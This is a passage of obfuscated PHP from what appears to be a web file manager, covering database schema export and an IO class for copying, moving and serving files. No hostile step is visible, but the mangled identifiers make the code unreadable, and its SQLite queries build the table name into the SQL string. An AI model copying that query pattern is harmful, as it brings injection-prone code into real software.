array_change_key_case($GLOBALS[$‚“Àş¢Ô[16]][$‚“Àş¢Ô[31]]); $ğœ‡Š¬ = $İ•ç…ì[$‚“Àş¢Ô[1022]]; $¹ÇŸó¯‡ = $‚“Àş¢Ô[1151] . $ğœ‡Š¬ . $‚“Àş¢Ô[1152] . $–˜øëà  . $‚“Àş¢Ô[68]; $™ğ±ú™§ = $‚“Àş¢Ô[1153] . $–˜øëà  . $‚“Àş¢Ô[950]; $©Õ€«Ä = $ôşİã‰Ã->query($¹ÇŸó¯‡); if (empty($©Õ€«Ä)) { $­üŞ‹¬ = array($‚“Àş¢Ô[854] => $‚“Àş¢Ô[22], $‚“Àş¢Ô[23] => $‚“Àş¢Ô[22]); return $ÍÙÂ»óÎ ? $­üŞ‹¬[$ÍÙÂ»óÎ] : $­üŞ‹¬; } $®Èå“…“ = $ôşİã‰Ã->query($™ğ±ú™§); $ãÑ¦Ôó = $‚“Àş¢Ô[22]; $Š¢”§¨Ø = array(); foreach ($®Èå“…“ as $ÁÂ¡) { if (!$ãÑ¦Ôó && $ÁÂ¡[$‚“Àş¢Ô[1154]] == $‚“Àş¢Ô[1155]) { $ãÑ¦Ôó = $ÁÂ¡[$‚“Àş¢Ô[1156]]; } if (isset($Š¢”§¨Ø[$ÁÂ¡[$‚“Àş¢Ô[1154]]])) { $Š¢”§¨Ø[$ÁÂ¡[$‚“Àş¢Ô[1154]]][$‚“Àş¢Ô[1157]][] = $ÁÂ¡[$‚“Àş¢Ô[1156]]; continue; } $Š¢”§¨Ø[$ÁÂ¡[$‚“Àş¢Ô[1154]]] = array($‚“Àş¢Ô[1158] => $ÁÂ¡[$‚“Àş¢Ô[1154]], $‚“Àş¢Ô[1157] => array($ÁÂ¡[$‚“Àş¢Ô[1156]]), $‚“Àş¢Ô[1159] => $ÁÂ¡[$‚“Àş¢Ô[1160]] == $‚“Àş¢Ô[101] ? 0 : 1); } $×­ÀÑ¶š = array(); foreach ($Š¢”§¨Ø as $ÁÂ¡) { $¤ªî«Ó£ = $ÁÂ¡[$‚“Àş¢Ô[1158]] == $‚“Àş¢Ô[1155]; $‹ÀÜùÑØ = array($‚“Àş¢Ô[1161], $ÁÂ¡[$‚“Àş¢Ô[1159]] == $‚“Àş¢Ô[101] && !$¤ªî«Ó£ ? $‚“Àş¢Ô[1162] : $‚“Àş¢Ô[22], $‚“Àş¢Ô[1163], $‚“Àş¢Ô[1164] . $–˜øëà  . $‚“Àş¢Ô[21] . ($¤ªî«Ó£ ? $‚“Àş¢Ô[1165] : $ÁÂ¡[$‚“Àş¢Ô[1158]]) . $‚“Àş¢Ô[131], $‚“Àş¢Ô[1166], $‚“Àş¢Ô[131] . $–˜øëà  . $‚“Àş¢Ô[131], $‚“Àş¢Ô[1167] . implode($‚“Àş¢Ô[1168], $ÁÂ¡[$‚“Àş¢Ô[1157]]) . $‚“Àş¢Ô[1169]); $×­ÀÑ¶š[] = implode($‚“Àş¢Ô[63], $‹ÀÜùÑØ) . $‚“Àş¢Ô[84]; } $À·ÕÍĞ’ = array(); $€àåŠÍ = array($‚“Àş¢Ô[1170] => $‚“Àş¢Ô[1171], $‚“Àş¢Ô[1171] => $‚“Àş¢Ô[1171], $‚“Àş¢Ô[348] => $‚“Àş¢Ô[375], $‚“Àş¢Ô[347] => $‚“Àş¢Ô[375]); foreach ($©Õ€«Ä as $ÁÂ¡) { $‹ÀÜùÑØ = array($‚“Àş¢Ô[131] . $ÁÂ¡[$‚“Àş¢Ô[1172]] . $‚“Àş¢Ô[131], isset($€àåŠÍ[$ÁÂ¡[$‚“Àş¢Ô[1173]]]) ? $€àåŠÍ[$ÁÂ¡[$‚“Àş¢Ô[1173]]] : $ÁÂ¡[$‚“Àş¢Ô[1174]], $ÁÂ¡[$‚“Àş¢Ô[1175]] == $‚“Àş¢Ô[948] ? $‚“Àş¢Ô[1176] : $‚“Àş¢Ô[1177], $ÁÂ¡[$‚“Àş¢Ô[1172]] == $ãÑ¦Ôó ? $‚“Àş¢Ô[1178] : $‚“Àş¢Ô[22], $ÁÂ¡[$‚“Àş¢Ô[999]] ? strtoupper(str_replace($‚“Àş¢Ô[21], $‚“Àş¢Ô[22], $ÁÂ¡[$‚“Àş¢Ô[999]])) : $‚“Àş¢Ô[22]); $À·ÕÍĞ’[] = trim(implode($‚“Àş¢Ô[63], $‹ÀÜùÑØ)); } $°ÕÔÖ÷ = array($‚“Àş¢Ô[1179] . $–˜øëà  . $‚“Àş¢Ô[1180], $‚“Àş¢Ô[1181] . $–˜øëà  . $‚“Àş¢Ô[1182], implode($‚“Àş¢Ô[60] . PHP_EOL, $À·ÕÍĞ’), $‚“Àş¢Ô[996]); $ÄÙ„£ÔÎ = implode(PHP_EOL, array_merge($°ÕÔÖ÷, $×­ÀÑ¶š)); if ($ÍÙÂ»óÎ && $ÍÙÂ»óÎ == $‚“Àş¢Ô[23]) { return $ÄÙ„£ÔÎ; } $­üŞ‹¬ = array($‚“Àş¢Ô[854] => $Ààü«Ìë, $‚“Àş¢Ô[23] => $ÄÙ„£ÔÎ); return $ÍÙÂ»óÎ ? $­üŞ‹¬[$ÍÙÂ»óÎ] : $­üŞ‹¬; } public function sqlFromSqlite($¬Ü¦ÄÌò, $ì¨—÷ÕÃ = '') { $ß‘û›äù =& $_SERVER[Õò”†—·]; $Àø¹¿¹ç = $this->model()->db(); $ÆÀ€Çšñ = "\120\122\x41\107\x4d\101\40\124\x41\102\114\105\137\111\x4e\106\117\40\x28\47{$¬Ü¦ÄÌò}\47\x29"; $ş¡×å¯à = "\123\x45\114\105\103\x54\40\x2a\x20\x46\x52\x4f\115\x20\x73\161\x6c\151\164\145\x5f\155\141\163\x74\145\x72\x20\127\110\x45\x52\105\40\164\142\x6c\137\x6e\141\x6d\145\40\x3d\x20\47{$¬Ü¦ÄÌò}\47"; $öàï÷‰ = $Àø¹¿¹ç->query($ÆÀ€Çšñ); if (empty($öàï÷‰)) { $Ã‚¥Î¬ = array($ß‘û›äù[854] => $ß‘û›äù[22], $ß‘û›äù[23] => $ß‘û›äù[22]); return $ì¨—÷ÕÃ ? $Ã‚¥Î¬[$ì¨—÷ÕÃ] : $Ã‚¥Î¬; } $‰Ù® ›ö = $Àø¹¿¹ç->query($ş¡×å¯à); $â––‚Ó = $á™å»Û = array(); foreach ($‰Ù® ›ö as $ÌÇ¼±Ğû) { if ($ÌÇ¼±Ğû[$ß‘û›äù[43]] == $ß‘û›äù[340]) { $â––‚Ó[] = $ÌÇ¼±Ğû[$ß‘û›äù[1183]]; } else { $á™å»Û[$ÌÇ¼±Ğû[$ß‘û›äù[42]]] = $ÌÇ¼±Ğû[$ß‘û›äù[1183]]; } } $€»®åæ = array_merge(array($ß‘û›äù[1179] . $¬Ü¦ÄÌò . $ß‘û›äù[131]), $â––‚Ó, array_values($á™å»Û)); $€»®åæ = implode($ß‘û›äù[84] . PHP_EOL, $€»®åæ) . $ß‘û›äù[84]; if ($ì¨—÷ÕÃ && $ì¨—÷ÕÃ == $ß‘û›äù[23]) { return $€»®åæ; } $ØÁÂ„ó„ = array(); $À¬Ö×Å» = array($ß‘û›äù[1171] => $ß‘û›äù[1184], $ß‘û›äù[375] => $ß‘û›äù[1185]); $„¤—¦âÃ = $ß‘û›äù[22]; foreach ($öàï÷‰ as $ÌÇ¼±Ğû) { if ($ÌÇ¼±Ğû[$ß‘û›äù[67]] == $ß‘û›äù[101]) { $„¤—¦âÃ = $ÌÇ¼±Ğû[$ß‘û›äù[42]]; } $Êƒè ğ‚ = array($ß‘û›äù[445] . $ÌÇ¼±Ğû[$ß‘û›äù[42]] . $ß‘û›äù[445], isset($À¬Ö×Å»[$ÌÇ¼±Ğû[$ß‘û›äù[43]]]) ? $À¬Ö×Å»[$ÌÇ¼±Ğû[$ß‘û›äù[43]]] : $ÌÇ¼±Ğû[$ß‘û›äù[43]], $ÌÇ¼±Ğû[$ß‘û›äù[45]] == $ß‘û›äù[101] ? $ß‘û›äù[1176] : $ß‘û›äù[1186] . $ÌÇ¼±Ğû[$ß‘û›äù[66]], $ÌÇ¼±Ğû[$ß‘û›äù[67]] == $ß‘û›äù[101] ? $ß‘û›äù[1187] : $ß‘û›äù[22]); $ØÁÂ„ó„[] = trim(implode($ß‘û›äù[63], $Êƒè ğ‚)); } foreach ($á™å»Û as $Ü¾Óá¨£ => $—ï³ß•¥) { $üõİÃû = str_replace($ß‘û›äù[1188] . $¬Ü¦ÄÌò . $ß‘û›äù[21], $ß‘û›äù[22], $Ü¾Óá¨£); $Öóçû« = str_replace(array($ß‘û›äù[131], $ß‘û›äù[1007]), $ß‘û›äù[445], substr($—ï³ß•¥, stripos($—ï³ß•¥, $ß‘û›äù[321]))); if ($üõİÃû == $ß‘û›äù[1165]) { $¨é×™ş = $ß‘û›äù[1189] . $„¤—¦âÃ . $ß‘û›äù[1190]; } else { $¨é×™ş = (stripos($üõİÃû, $ß‘û›äù[21]) ? $ß‘û›äù[1191] : $ß‘û›äù[22]) . ($ß‘û›äù[1192] . $üõİÃû . $ß‘û›äù[1193] . $Öóçû«); } $ØÁÂ„ó„[] = $¨é×™ş; } $º»à½ç = array($ß‘û›äù[1194] . $¬Ü¦ÄÌò . $ß‘û›äù[1195], $ß‘û›äù[1196] . $¬Ü¦ÄÌò . $ß‘û›äù[1197], implode($ß‘û›äù[60] . PHP_EOL, $ØÁÂ„ó„), $ß‘û›äù[1198]); $ƒ¥±‰š» = implode(PHP_EOL, $º»à½ç); if ($ì¨—÷ÕÃ && $ì¨—÷ÕÃ == $ß‘û›äù[854]) { return $ƒ¥±‰š»; } $Ã‚¥Î¬ = array($ß‘û›äù[854] => $ƒ¥±‰š», $ß‘û›äù[23] => $€»®åæ); return $ì¨—÷ÕÃ ? $Ã‚¥Î¬[$ì¨—÷ÕÃ] : $Ã‚¥Î¬; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($–‡›‡ş, $ÙøÔÁûõ) { $„€à—«‚ =& $_SERVER[Õò”†—·]; $í®Àå = $ÙøÔÁûõ; $GLOBALS[$„€à—«‚[1199]] = $„€à—«‚[1200] . $–‡›‡ş; Hook::trigger($„€à—«‚[1200] . $–‡›‡ş . $„€à—«‚[1201], $í®Àå); $éŒğ…™ç = self::driverMake($ÙøÔÁûõ[0]); if (!$éŒğ…™ç) { return !1; } if (method_exists($éŒğ…™ç, $–‡›‡ş)) { $¢úÑ’Åº = @call_user_func_array(array($éŒğ…™ç, $–‡›‡ş), $ÙøÔÁûõ); } else { if (method_exists($éŒğ…™ç, $„€à—«‚[1202])) { $¢úÑ’Åº = @call_user_func_array(array($éŒğ…™ç, $–‡›‡ş), $ÙøÔÁûõ); } else { if (method_exists(self, $–‡›‡ş)) { $¢úÑ’Åº = @call_user_func_array(array(self, $–‡›‡ş), $ÙøÔÁûõ); } else { $¢úÑ’Åº = call_user_func_array(array(parent, $–‡›‡ş), $ÙøÔÁûõ); } } } Hook::trigger($„€à—«‚[1200] . $–‡›‡ş . $„€à—«‚[1203], $í®Àå, $¢úÑ’Åº); return $¢úÑ’Åº; } public static function init($¤Æ Ì‘) { return self::driverMake($¤Æ Ì‘); } public static function copy($ÏÆÛÚ“, $ÊÃ±¹”“, $ğÌ³®ïß = false, $Ó‘Ñ¥ÌÏ = false) { return self::copyMoveStart($ÏÆÛÚ“, $ÊÃ±¹”“, $ğÌ³®ïß, $_SERVER[Õò”†—·][602], $Ó‘Ñ¥ÌÏ); } public static function move($êô·ìû, $½ìğ·», $·ø—Ì¿ù = false, $ÖÕ’ŒÈº = false) { return self::copyMoveStart($êô·ìû, $½ìğ·», $·ø—Ì¿ù, $_SERVER[Õò”†—·][604], $ÖÕ’ŒÈº); } private static function copyMoveStart($¯øÕÙ² , $—šÌÅŒé, $ïóÄÚ©¡, $Òàè©, $À»¸âŒ°) { $äÒÌÅ£ =& $_SERVER[Õò”†—·]; $áêËäßê = array($¯øÕÙ² , $—šÌÅŒé, $ïóÄÚ©¡, $À»¸âŒ°); Hook::trigger($äÒÌÅ£[1200] . $Òàè© . $äÒÌÅ£[1201], $áêËäßê); $ÌàÌ£ù‘ = self::copyMove($¯øÕÙ² , $—šÌÅŒé, $ïóÄÚ©¡, $Òàè©, $À»¸âŒ°); Hook::trigger($äÒÌÅ£[1200] . $Òàè© . $äÒÌÅ£[1203], $áêËäßê, $ÌàÌ£ù‘); return $ÌàÌ£ù‘; } public static function saveFile($­×çØÈ, $°Î±Í‹ü, $ü ©öí´ = true) { $¯‘Òß ­ =& $_SERVER[Õò”†—·]; $´Ùò‡ÏÊ = self::info($°Î±Í‹ü); $ŸŠÒÊ¦µ = self::driverMake($­×çØÈ); $ïÕÈ‚ = self::driverMake($°Î±Í‹ü); $÷éê£ÅÉ = !1; if ($ïÕÈ‚->pathParse[$¯‘Òß ­[1204]]) { $÷éê£ÅÉ = $ïÕÈ‚; $¬Åã¥ä = $ïÕÈ‚->pathParse[$¯‘Òß ­[1204]]; $ïÕÈ‚ = self::driverMake($¬Åã¥ä); } if ($ŸŠÒÊ¦µ->pathParse[$¯‘Òß ­[1204]]) { $ÊŸòÆò = $ŸŠÒÊ¦µ->pathParse[$¯‘Òß ­[1204]]; $ŸŠÒÊ¦µ = self::driverMake($ÊŸòÆò); } $§½úÍü = $ïÕÈ‚->pathFather($°Î±Í‹ü); $’­Úö = !0; if (!$ü ©öí´ && self::driverIsSame($ŸŠÒÊ¦µ, $ïÕÈ‚)) { $’­Úö = !1; } $˜âÌß¶ğ = self::copyFile($ŸŠÒÊ¦µ, $­×çØÈ, $ïÕÈ‚, $§½úÍü, $´Ùò‡ÏÊ[$¯‘Òß ­[42]], $’­Úö); if ($÷éê£ÅÉ) { $˜âÌß¶ğ = $÷éê£ÅÉ->getPathOuter($˜âÌß¶ğ); } return $˜âÌß¶ğ; } private static function copyMove($Âµ‰ıëº, $ÔÌ… , $’ÍçùŒ“, $¶ıİ ÷, $±ºËªÜ„ = false) { $‹Â Ö =& $_SERVER[Õò”†—·]; if (!$Âµ‰ıëº || $Âµ‰ıëº == $‹Â Ö[18] || !$ÔÌ… ) { return !1; } ignore_timeout(); $ü§×‰Î’ = self::driverMake($Âµ‰ıëº); $Ÿ¿°¤š¯ = self::driverMake($ÔÌ… ); $˜Ñ£¸­æ = $¶ıİ ÷ == $‹Â Ö[604]; $ŞÊæëÚ = !1; if ($Ÿ¿°¤š¯->pathParse[$‹Â Ö[1204]]) { $ŞÊæëÚ = $Ÿ¿°¤š¯; $ÔÌ…  = $Ÿ¿°¤š¯->pathParse[$‹Â Ö[1204]]; $Ÿ¿°¤š¯ = self::driverMake($ÔÌ… ); } if ($ü§×‰Î’->pathParse[$‹Â Ö[1204]]) { $Âµ‰ıëº = $ü§×‰Î’->pathParse[$‹Â Ö[1204]]; $ü§×‰Î’ = self::driverMake($Âµ‰ıëº); } self::check($ü§×‰Î’, $Âµ‰ıëº, $Ÿ¿°¤š¯, $ÔÌ… ); Hook::trigger($‹Â Ö[1205], $ü§×‰Î’, $Âµ‰ıëº, $Ÿ¿°¤š¯, $ÔÌ… ); $æÀø¾“ = self::driverIsSame($ü§×‰Î’, $Ÿ¿°¤š¯); if ($æÀø¾“) { if ($¶ıİ ÷ == $‹Â Ö[604] && !method_exists($Ÿ¿°¤š¯, $‹Â Ö[1206]) && trim($ÔÌ… , $‹Â Ö[18]) == trim($Ÿ¿°¤š¯->pathFather($Âµ‰ıëº), $‹Â Ö[18])) { if ($ü§×‰Î’->pathThis($Âµ‰ıëº) != $±ºËªÜ„ && !$ü§×‰Î’->isOsDriver()) { return $ü§×‰Î’->rename($Âµ‰ıëº, $±ºËªÜ„); } return $Ÿ¿°¤š¯->getPathOuter($Âµ‰ıëº); } if (method_exists($Ÿ¿°¤š¯, $¶ıİ ÷)) { return $Ÿ¿°¤š¯->{$¶ıİ ÷}($Âµ‰ıëº, $ÔÌ… , $’ÍçùŒ“, $±ºËªÜ„); } } if ($æÀø¾“ && $¶ıİ ÷ == $‹Â Ö[604] && $Ÿ¿°¤š¯->getType() == $‹Â Ö[119]) { $ĞÙË×à“ = $Ÿ¿°¤š¯->movePath($Âµ‰ıëº, $ÔÌ… , $±ºËªÜ„); if ($ĞÙË×à“) { return $ĞÙË×à“; } } $îØ™ôô» = $ü§×‰Î’->isFile($Âµ‰ıëº); if (!$îØ™ôô» && $Ÿ¿°¤š¯->getType() == $‹Â Ö[808] && $ü§×‰Î’->getType() == $‹Â Ö[119]) { $ĞÙË×à“ = $Ÿ¿°¤š¯->copyFolderFromIO($ü§×‰Î’, $Âµ‰ıëº, $ÔÌ… , $’ÍçùŒ“, $˜Ñ£¸­æ, $±ºËªÜ„); } else { $ĞÙË×à“ = self::copyPath($ü§×‰Î’, $Âµ‰ıëº, $Ÿ¿°¤š¯, $ÔÌ… , $’ÍçùŒ“, $˜Ñ£¸­æ, $îØ™ôô», $±ºËªÜ„); } if ($ĞÙË×à“ && $˜Ñ£¸­æ) { $ü§×‰Î’->remove($Âµ‰ıëº); } if ($ŞÊæëÚ) { $ĞÙË×à“ = $ŞÊæëÚ->getPathOuter($ĞÙË×à“); } return $ĞÙË×à“; } private static function check($ıÒÓş®À, $öÇÅùßñ, $°„ª¸², &$˜“‘­õª) { $•¤“ä‡“ =& $_SERVER[Õò”†—·]; if (self::driverIsSame($ıÒÓş®À, $°„ª¸²) && $ıÒÓş®À->isFolder($öÇÅùßñ) && $ıÒÓş®À->isParentOf($öÇÅùßñ, $˜“‘­õª)) { show_json(LNG($•¤“ä‡“[1207]), !1); } if (!$ıÒÓş®À->exist($öÇÅùßñ)) { show_json(LNG($•¤“ä‡“[118]), !1); } } private static function copyPath($ıÙÍÄ…®, $–„ñ ½İ, $Ù£ˆ—ª, $œèãò¦‰, $å³Ş´î´, $°„óù½˜, $è“ôû¯ı, $…¨´üÙŞ = false, $Ìí­†š = true) { $›¦¡ƒ£’ =& $_SERVER[Õò”†—·]; $ĞªÌÍûû = empty($…¨´üÙŞ) && $…¨´üÙŞ !== $›¦¡ƒ£’[229] ? $ıÙÍÄ…®->pathThis($–„ñ ½İ) : $…¨´üÙŞ; if ($å³Ş´î´) { $‰¡ú”Åï = $Ù£ˆ—ª->fileNameExist($œèãò¦‰, $ĞªÌÍûû); $²óô©ş… = $ĞªÌÍûû; $ĞªÌÍûû = $Ù£ˆ—ª->fileNameAuto($œèãò¦‰, $ĞªÌÍûû, $å³Ş´î´, !$è“ôû¯ı); if (!$‰¡ú”Åï || $²óô©ş… != $ĞªÌÍûû) { $å³Ş´î´ = !1; } if ($Ìí­†š && !$å³Ş´î´) { $Ù£ˆ—ª->_data[$›¦¡ƒ£’[1208]] = !0; } } if ($è“ôû¯ı) { return self::copyFile($ıÙÍÄ…®, $–„ñ ½İ, $Ù£ˆ—ª, $œèãò¦‰, $ĞªÌÍûû, $°„óù½˜); } if ($å³Ş´î´ == REPEAT_RENAME_FOLDER) { $å³Ş´î´ = !1; } $ùÕãşóØ = rtrim($œèãò¦‰, $›¦¡ƒ£’[18]) . $›¦¡ƒ£’[18] . $ĞªÌÍûû; $„ßÅñ®Â = $Ù£ˆ—ª->mkdir($Ù£ˆ—ª->getPath($ùÕãşóØ), $å³Ş´î´); $œèãò¦‰ = $Ù£ˆ—ª->getPathInner($„ßÅñ®Â); $£üÁÒ = $ıÙÍÄ…®->listPath($–„ñ ½İ, !0); $£üÁÒ = is_array($£üÁÒ) ? $£üÁÒ : array($›¦¡ƒ£’[96] => array(), $›¦¡ƒ£’[95] => array()); $×éÌ§Íˆ = array_merge($£üÁÒ[$›¦¡ƒ£’[96]], $£üÁÒ[$›¦¡ƒ£’[95]]); foreach ($×éÌ§Íˆ as $†ÍƒæÖ) { $Æ÷³ğŠÕ = $†ÍƒæÖ[$›¦¡ƒ£’[43]] == $›¦¡ƒ£’[231]; $–„ñ ½İ = $ıÙÍÄ…®->getPathInner($†ÍƒæÖ[$›¦¡ƒ£’[97]]); $Üö€”ÄÚ = self::copyPath($ıÙÍÄ…®, $–„ñ ½İ, $Ù£ˆ—ª, $œèãò¦‰, $å³Ş´î´, $°„óù½˜, $Æ÷³ğŠÕ, !1, !1); if (!$Üö€”ÄÚ) { IO::errorTips($›¦¡ƒ£’[1209] . $–„ñ ½İ . $›¦¡ƒ£’[83] . $œèãò¦‰); } } self::copyMoveKeepInfo($ıÙÍÄ…®, $–„ñ ½İ, $„ßÅñ®Â); return $„ßÅñ®Â; } private static function copyFile($¹ÇÕÌ­˜, $Ø°Ûæ†ì, $Éü™îß‡, $«Ÿ§«œï, $âœ¶Óã, $ÑóÁ¤ç) { $•á¼ìÇÕ =& $_SERVER[Õò”†—·]; $«Ÿ§«œï = $Éü™îß‡->getPath(rtrim($«Ÿ§«œï, $•á¼ìÇÕ[18]) . $•á¼ìÇÕ[18] . $âœ¶Óã); $”©™Ëë = $•á¼ìÇÕ[1210] . time() . rand_string(5); Hook::trigger($•á¼ìÇÕ[1211], $¹ÇÕÌ­˜, $Ø°Ûæ†ì, $Éü™îß‡, $«Ÿ§«œï, $âœ¶Óã, $”©™Ëë); if (self::driverIsSame($¹ÇÕÌ­˜, $Éü™îß‡)) { if ($ÑóÁ¤ç) { $úÖĞ£ÈÔ = $Éü™îß‡->moveFile($Ø°Ûæ†ì, $«Ÿ§«œï); } else { $úÖĞ£ÈÔ = $Éü™îß‡->copyFile($Ø°Ûæ†ì, $«Ÿ§«œï); } Hook::trigger($•á¼ìÇÕ[1212], $¹ÇÕÌ­˜, $Ø°Ûæ†ì, $Éü™îß‡, $«Ÿ§«œï, $âœ¶Óã, $úÖĞ£ÈÔ); self::copyMoveKeepInfo($¹ÇÕÌ­˜, $Ø°Ûæ†ì, $úÖĞ£ÈÔ); return $úÖĞ£ÈÔ; } $•Şáüæ± = TEMP_FILES; if ($GLOBALS[$•á¼ìÇÕ[16]][$•á¼ìÇÕ[102]][$•á¼ìÇÕ[846]]) { $•Şáüæ± = $GLOBALS[$•á¼ìÇÕ[16]][$•á¼ìÇÕ[102]][$•á¼ìÇÕ[846]]; } $ö¸óİ…ö = $•Şáüæ±; mk_dir($ö¸óİ…ö); $û¿»ÖÑÁ = $ö¸óİ…ö . $”©™Ëë; $‚†ºşæ = $û¿»ÖÑÁ; $û¿»ÖÑÁ = $¹ÇÕÌ­˜->download($Ø°Ûæ†ì, $û¿»ÖÑÁ); $û¿»ÖÑÁ = $¹ÇÕÌ­˜->iconvApp($û¿»ÖÑÁ); if (substr($û¿»ÖÑÁ, strlen($•Şáüæ±)) == $•Şáüæ±) { $ÑóÁ¤ç = !0; } $úÖĞ£ÈÔ = $Éü™îß‡->upload($«Ÿ§«œï, $û¿»ÖÑÁ, $ÑóÁ¤ç); self::remove($‚†ºşæ); Hook::trigger($•á¼ìÇÕ[1212], $¹ÇÕÌ­˜, $Ø°Ûæ†ì, $Éü™îß‡, $«Ÿ§«œï, $âœ¶Óã, $úÖĞ£ÈÔ); self::copyMoveKeepInfo($¹ÇÕÌ­˜, $Ø°Ûæ†ì, $úÖĞ£ÈÔ); return $úÖĞ£ÈÔ; } private static function copyMoveKeepInfo($¶Ë©Ÿâæ, $ìÒÀ½€¥, $“äËÇşŠ) { if (!$“äËÇşŠ) { return; } $íÕ²•¯Í = $¶Ë©Ÿâæ->info($ìÒÀ½€¥); if (!is_array($íÕ²•¯Í)) { return; } IO::setModifyTime($“äËÇşŠ, $íÕ²•¯Í[$_SERVER[Õò”†—·][98]]); } public static function pathFather($ãö½ÜŸÒ) { $÷à’‡ÄÍ = IO::init($ãö½ÜŸÒ); $Ö¬õà¨ = $÷à’‡ÄÍ->pathFather($÷à’‡ÄÍ->path); return $÷à’‡ÄÍ->getPathOuter($Ö¬õà¨); } public static function fileOut($¯õãÈÎá, $ßúé«» = false, $ğ„ô–  = false, $¸ÑÓÚñ = '') { $¬ûÊĞé¾ = self::driverMake($¯õãÈÎá); if ($¬ûÊĞé¾->isFileOutServer()) { return $¬ûÊĞé¾->fileOutServer($¯õãÈÎá, $ßúé«», $ğ„ô– , $¸ÑÓÚñ); } return $¬ûÊĞé¾->fileOut($¯õãÈÎá, $ßúé«», $ğ„ô– , $¸ÑÓÚñ); } public static function fileOutImage($ÕÆ‚¸ÍÄ, $ú¢ô˜ö´ = 250) { $¦¦±Ò•– = array(250, 600, 1200, 2000, 3000, 5000); for ($ÍâëéÀ¯ = 0; $ÍâëéÀ¯ < count($¦¦±Ò•–); $ÍâëéÀ¯++) { if ($ÍâëéÀ¯ == 0 && $ú¢ô˜ö´ <= $¦¦±Ò•–[$ÍâëéÀ¯]) { $ú¢ô˜ö´ = $¦¦±Ò•–[$ÍâëéÀ¯]; break; } else { if ($ú¢ô˜ö´ > $¦¦±Ò•–[$ÍâëéÀ¯ - 1] && $ú¢ô˜ö´ <= $¦¦±Ò•–[$ÍâëéÀ¯]) { $ú¢ô˜ö´ = $¦¦±Ò•–[$ÍâëéÀ¯]; break; } else { if ($ÍâëéÀ¯ == count($¦¦±Ò•–) - 1 && $ú¢ô˜ö´ > $¦¦±Ò•–[$ÍâëéÀ¯]) { $ú¢ô˜ö´ = $¦¦±Ò•–[$ÍâëéÀ¯]; break; } } } } $³–ÒÓ„ = self::driverMake($ÕÆ‚¸ÍÄ); if ($³–ÒÓ„->isFileOutServer()) { return $³–ÒÓ„->fileOutImageServer($ÕÆ‚¸ÍÄ, $ú¢ô˜ö´); } return $³–ÒÓ„->fileOutImage($ÕÆ‚¸ÍÄ, $ú¢ô˜ö´); } private static function driverIsSame($¤õı§©, $ç‘¶»Ù) { $ÕŒ¾êğŸ =& $_SERVER[Õò”†—·]; $˜ïÛŸˆú = $¤õı§©->getType(); $‹ºÏíå€ = $ç‘¶»Ù->getType(); if ($˜ïÛŸˆú != $‹ºÏíå€) { return !1; } if ($˜ïÛŸˆú == $ÕŒ¾êğŸ[808]) { return !0; } if ($˜ïÛŸˆú == $ÕŒ¾êğŸ[119]) { return !0; } if ($¤õı§©->pathDriver == $ç‘¶»Ù->pathDriver) { return !0; } return !1; } public static function copyUpdate($Äìç»íä, $–šş‚«ˆ) { $Ò‘·÷Üü =& $_SERVER[Õò”†—·]; if (!IO::exist($Äìç»íä)) { return !1; } if (!IO::exist($–šş‚«ˆ)) { IO::mkdir($–šş‚«ˆ); } $»±®Î×Å = array_to_keyvalue(self::listAllSimple($Äìç»íä), $Ò‘·÷Üü[97]); $¡ÉÓûÑâ = array_to_keyvalue(self::listAllSimple($–šş‚«ˆ), $Ò‘·÷Üü[97]); $­Ù´§´ó = array(); $ëì¹ĞŒê = array(); foreach ($»±®Î×Å as $¼•Öüã¢ => $ê‚Ğë­) { if (isset($¡ÉÓûÑâ[$¼•Öüã¢])) { if ($ê‚Ğë­[$Ò‘·÷Üü[88]] == 1) { continue; } if ($¡ÉÓûÑâ[$¼•Öüã¢][$Ò‘·÷Üü[89]] == $ê‚Ğë­[$Ò‘·÷Üü[89]]) { continue; } } if ($ê‚Ğë­[$Ò‘·÷Üü[88]] == 1) { $ëì¹ĞŒê[] = $–šş‚«ˆ . $Ò‘·÷Üü[18] . trim($¼•Öüã¢, $Ò‘·÷Üü[18]); continue; } $ŞÜõé§Ô = strstr(trim($¼•Öüã¢, $Ò‘·÷Üü[18]), $Ò‘·÷Üü[18]) ? get_path_father($¼•Öüã¢) : $Ò‘·÷Üü[22]; $­Ù´§´ó[] = array($Ò‘·÷Üü[1213] => $ê‚Ğë­[$Ò‘·÷Üü[99]], $Ò‘·÷Üü[1214] => rtrim($–šş‚«ˆ, $Ò‘·÷Üü[18]) . $Ò‘·÷Üü[18] . $ŞÜõé§Ô, $Ò‘·÷Üü[1215] => $ê‚Ğë­); } $«ĞÙóšÙ = array($Ò‘·÷Üü[231] => $­Ù´§´ó, $Ò‘·÷Üü[88] => $ëì¹ĞŒê); Hook::trigger($Ò‘·÷Üü[1216], $Äìç»íä, $–šş‚«ˆ, $«ĞÙóšÙ); foreach ($ëì¹ĞŒê as $ê‚Ğë­) { IO::mkdir($ê‚Ğë­); } foreach ($­Ù´§´ó as $ê‚Ğë­) { IO::copy($ê‚Ğë­[$Ò‘·÷Üü[1213]], $ê‚Ğë­[$Ò‘·÷Üü[1214]], REPEAT_REPLACE); } } public static function fileSubstr($ÌâÖ¯†, $Ïˆû‘×ö, $ÖìÕ„ï = false) { $×Ñûß¶ =& $_SERVER[Õò”†—·]; $“ÒÀô™¬ = self::driverMake($ÌâÖ¯†); $Åığ­ƒË = $“ÒÀô™¬->size($ÌâÖ¯†); $öé¨Ÿóà = $Ïˆû‘×ö; $ó¿ ·¥ = $ÖìÕ„ï; if ($Ïˆû‘×ö < 0) { $Ïˆû‘×ö = $Åığ­ƒË + $Ïˆû‘×ö; } if ($ÖìÕ„ï === !1) { $ÖìÕ„ï = $Åığ­ƒË - $Ïˆû‘×ö; } if ($Ïˆû‘×ö + $ÖìÕ„ï > $Åığ­ƒË) { $ÖìÕ„ï = $Åığ­ƒË - $Ïˆû‘×ö; } if (!$Åığ­ƒË && $“ÒÀô™¬->getType() == $×Ñûß¶[119] && !$“ÒÀô™¬->exist($ÌâÖ¯†)) { $Ù¦ó–Â³ = get_path_this($ÌâÖ¯†); $í‹°ªáü = parse_url_query($Ù¦ó–Â³); if (is_array($í‹°ªáü) && isset($í‹°ªáü[$×Ñûß¶[42]])) { $Ù¦ó–Â³ = urldecode($í‹°ªáü[$×Ñûß¶[42]]); } throw new Exception($×Ñûß¶[1217] . LNG($×Ñûß¶[1218]) . $×Ñûß¶[1016] . clear_html($Ù¦ó–Â³) . $×Ñûß¶[22]); } if ($ÖìÕ„ï <= 0) { return $×Ñûß¶[22]; } if ($Ïˆû‘×ö < 0 || 